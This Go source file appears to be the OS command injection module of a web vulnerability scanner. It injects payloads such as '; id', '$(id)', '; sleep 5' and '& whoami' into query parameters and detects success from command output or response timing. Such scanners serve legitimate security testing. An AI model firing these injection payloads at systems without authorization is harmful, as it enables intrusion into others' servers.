package core

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

type OSCmdType string

const (
	CmdReflection OSCmdType = "reflection"
	CmdTimeBased  OSCmdType = "time_based"
	CmdBoolean    OSCmdType = "boolean"
)

type OSPayload struct {
	Value string
	Type  OSCmdType
	OS    string // "unix" or "windows"
}

type OSValidator struct {
	Threshold time.Duration
}

func (v *OSValidator) IsVulnerable(resp *http.Response, body string, payload OSPayload, duration time.Duration) bool {
	switch payload.Type {
	case CmdReflection:
		// Look for common OS command output patterns
		indicators := []string{
			"uid=", "gid=", "groups=", // from 'id'
			"Volume in drive", "Directory of", // from 'dir'
			"drwxr-xr-x", "rw-r--r--", // from 'ls -l'
			"Windows IP Configuration",          // from 'ipconfig'
			"eth0", "inet addr:", "inet6 addr:", // from 'ifconfig'
		}
		for _, indicator := range indicators {
			if strings.Contains(body, indicator) {
				return true
			}
		}
	case CmdTimeBased:
		if duration >= v.Threshold {
			return true
		}
	case CmdBoolean:
		// Boolean detection often uses echo to confirm execution
		if strings.Contains(body, "VULNERABLE") {
			return true
		}
	}
	return false
}

// OSCommandInjectionResult holds the result of the OSCommandInjection module execution.
type OSCommandInjectionResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// OSCommandInjection executes the os_command_injection security technique.
type OSCommandInjection struct {
	BaseModule
	Target    string
	Threshold time.Duration
	results   []OSCommandInjectionResult
}

// NewOSCommandInjection creates a new instance of OSCommandInjection.
func NewOSCommandInjection(target string) *OSCommandInjection {
	return &OSCommandInjection{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(15 * time.Second),
			MaxThreads: 5,
		},
		Target:    EnsureHTTPPrefix(target),
		Threshold: 4 * time.Second, // Default threshold
	}
}

// SetCookies sets the Cookie header value for the requests.
func (m *OSCommandInjection) SetCookies(cookies string) {
	m.BaseModule.Cookies = cookies
}

func (m *OSCommandInjection) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

// SetThreshold sets the time threshold for time-based detection.
func (m *OSCommandInjection) SetThreshold(threshold time.Duration) {
	m.Threshold = threshold
}

var osPayloads = []OSPayload{
	// Unix Reflection
	{Value: "; id", Type: CmdReflection, OS: "unix"},
	{Value: "| id", Type: CmdReflection, OS: "unix"},
	{Value: "`id`", Type: CmdReflection, OS: "unix"},
	{Value: "$(id)", Type: CmdReflection, OS: "unix"},

	// Unix Time-based
	{Value: "; sleep 5", Type: CmdTimeBased, OS: "unix"},
	{Value: "& sleep 5", Type: CmdTimeBased, OS: "unix"},
	{Value: "| sleep 5", Type: CmdTimeBased, OS: "unix"},

	// Unix Boolean
	{Value: " && echo VULNERABLE", Type: CmdBoolean, OS: "unix"},
	{Value: " || echo VULNERABLE", Type: CmdBoolean, OS: "unix"},
	{Value: "; echo VULNERABLE", Type: CmdBoolean, OS: "unix"},

	// Windows Reflection
	{Value: "& whoami", Type: CmdReflection, OS: "windows"},
	{Value: "| whoami", Type: CmdReflection, OS: "windows"},

	// Windows Time-based
	{Value: "& timeout /t 5", Type: CmdTimeBased, OS: "windows"},

	// Windows Boolean
	{Value: " && echo VULNERABLE", Type: CmdBoolean, OS: "windows"},
	{Value: " || echo VULNERABLE", Type: CmdBoolean, OS: "windows"},
}

func (m *OSCommandInjection) Execute(ctx context.Context) ([]OSCommandInjectionResult, error) {
	m.Mu.Lock()
	m.results = make([]OSCommandInjectionResult, 0)
	m.Mu.Unlock()

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return nil, err
	}

	headers := http.Header{}
	if m.BaseModule.Cookies != "" {
		headers.Set("Cookie", m.BaseModule.Cookies)
	}

	// Discover vectors
	vectors, _ := m.DiscoverVectors(parsedURL, nil, "", headers)

	hasQueryOrBody := false
	for _, v := range vectors {
		if v.Type == VectorQueryParam || v.Type == VectorFormBody || v.Type == VectorJSONBody {
			hasQueryOrBody = true
			break
		}
	}

	if !hasQueryOrBody {
		// Default vectors if none discovered
		vectors = append(vectors, InputVector{Type: VectorQueryParam, Key: "cmd", Value: ""})
		vectors = append(vectors, InputVector{Type: VectorQueryParam, Key: "exec", Value: ""})
	}

	validator := &OSValidator{
		Threshold: m.Threshold,
	}

	type job struct {
		vector  InputVector
		payload OSPayload
	}

	jobChan := make(chan job, len(vectors)*len(osPayloads))
	for _, v := range vectors {
		for _, p := range osPayloads {
			jobChan <- job{vector: v, payload: p}
		}
	}
	close(jobChan)

	var wg sync.WaitGroup

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobChan {
				select {
				case <-ctx.Done():
					return
				default:
					m.testVector(ctx, parsedURL, j.vector, j.payload, validator)
				}
			}
		}()
	}

	wg.Wait()

	m.Mu.Lock()
	defer m.Mu.Unlock()
	return m.results, nil
}

func (m *OSCommandInjection) testVector(ctx context.Context, u *url.URL, vector InputVector, payload OSPayload, validator *OSValidator) {
	duration, body, resp, err := m.sendPayload(ctx, u, vector, payload.Value)
	if err != nil {
		return
	}

	if validator.IsVulnerable(nil, body, payload, duration) {
		// Multi-stage verification
		if payload.Type == CmdTimeBased {
			// Differential timing analysis: try a "fast" payload.
			// Replace "sleep 5" or "timeout /t 5" with 0.
			fastValue := payload.Value
			if strings.Contains(fastValue, "sleep 5") {
				fastValue = strings.Replace(fastValue, "sleep 5", "sleep 0", 1)
			} else if strings.Contains(fastValue, "timeout /t 5") {
				fastValue = strings.Replace(fastValue, "timeout /t 5", "timeout /t 0", 1)
			}

			fastDuration, _, _, err := m.sendPayload(ctx, u, vector, fastValue)
			if err != nil {
				return
			}

			// If fast payload also takes long, it's likely a false positive (slow network/server).
			if fastDuration >= m.Threshold {
				return
			}
		} else if payload.Type == CmdBoolean || payload.Type == CmdReflection {
			// Chained command verification: verify with a different token to ensure it's not a fluke or static response
			verifyToken := "VERIFIED"
			verifyValue := strings.Replace(payload.Value, "VULNERABLE", verifyToken, 1)
			verifyValue = strings.Replace(verifyValue, "id", "echo "+verifyToken, 1)
			verifyValue = strings.Replace(verifyValue, "whoami", "echo "+verifyToken, 1)

			_, verifyBody, _, err := m.sendPayload(ctx, u, vector, verifyValue)
			if err != nil {
				return
			}

			if !strings.Contains(verifyBody, verifyToken) {
				return
			}
		}

		detail := fmt.Sprintf("OS injection successful in %s '%s' using %s %s payload: %s", vector.Type, vector.Key, payload.OS, payload.Type, payload.Value)
		m.RecordPoC(resp.Request, nil, detail)

		m.Mu.Lock()
		m.results = append(m.results, OSCommandInjectionResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: detail,
		})
		m.Mu.Unlock()
	}
}

func (m *OSCommandInjection) sendPayload(ctx context.Context, u *url.URL, vector InputVector, payloadValue string) (time.Duration, string, *http.Response, error) {
	var req *http.Request
	var err error

	testValue := vector.Value + payloadValue

	switch vector.Type {
	case VectorQueryParam:
		newU, _ := url.Parse(u.String())
		q := newU.Query()
		q.Set(vector.Key, testValue)
		newU.RawQuery = q.Encode()
		req, err = http.NewRequestWithContext(ctx, "GET", newU.String(), nil)
	default:
		// For now, only query params are supported in this implementation
		return 0, "", nil, fmt.Errorf("unsupported vector type: %s", vector.Type)
	}

	if err != nil || req == nil {
		return 0, "", nil, err
	}

	if m.BaseModule.Cookies != "" {
		req.Header.Set("Cookie", m.BaseModule.Cookies)
	}

	start := time.Now()
	resp, err := m.Client.Do(req)
	duration := time.Since(start)

	if err != nil {
		return 0, "", nil, err
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyStr := string(bodyBytes)

	return duration, bodyStr, resp, nil
}

func init() {
	RegisterModule("os_command_injection", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		onLog(fmt.Sprintf("Starting OSCommandInjection on: %s", target))

		tester := NewOSCommandInjection(target)
		tester.SetThreads(PayloadInt(payload, "threads", 5))
		threshold := PayloadInt(payload, "threshold", 4)
		tester.SetThreshold(time.Duration(threshold) * time.Second)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
